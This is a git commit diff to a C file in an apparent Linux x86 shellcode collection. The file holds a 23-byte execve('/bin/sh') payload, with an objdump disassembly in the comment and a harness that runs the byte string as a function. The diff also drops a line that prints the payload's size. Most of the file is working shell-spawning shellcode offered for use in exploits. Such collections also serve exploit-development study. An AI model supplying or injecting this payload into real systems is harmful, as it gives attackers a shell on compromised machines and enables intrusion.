5df5a21c6f475beae1dc443c9768a5ee53744d6e
Kawane <49018919+kawane21@users.noreply.github.com>
2019-04-10 17:09:29 +0900

    Update execve_bin_sh.c

--- linux_x86/execve_bin_sh.c
+++ linux_x86/execve_bin_sh.c
@@ -1,17 +1,20 @@
 
 /*
- * (linux/x86) /bin/sh shellcode --24 bytes--
-	_start:
-		xor	eax, eax
-		push	eax
-		push	0x68732f6e ;//bin/sh
-		push	0x69622f2f
-		mov	ebx, esp
-		push	eax
-		push	ebx
-		mov	ecx, esp
-		mov	al,  0xb
-		int 	0x80
+ * (linux/x86) /bin/sh shellcode --23 bytes--
+ 
+ 
+08049000 <_start>:
+ 8049000:	31 c0                	xor    %eax,%eax
+ 8049002:	50                   	push   %eax
+ 8049003:	68 6e 2f 73 68       	push   $0x68732f6e
+ 8049008:	68 2f 2f 62 69       	push   $0x69622f2f
+ 804900d:	89 e3                	mov    %esp,%ebx
+ 804900f:	50                   	push   %eax
+ 8049010:	53                   	push   %ebx
+ 8049011:	89 e1                	mov    %esp,%ecx
+ 8049013:	b0 0b                	mov    $0xb,%al
+ 8049015:	cd 80                	int    $0x80
+
 
 */
 
@@ -21,6 +24,5 @@ char shellcode[] = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3
 
 int main(void)
 {
-	printf("size = %d\n", sizeof(shellcode));
 	(*(void(*)())shellcode)();
 }
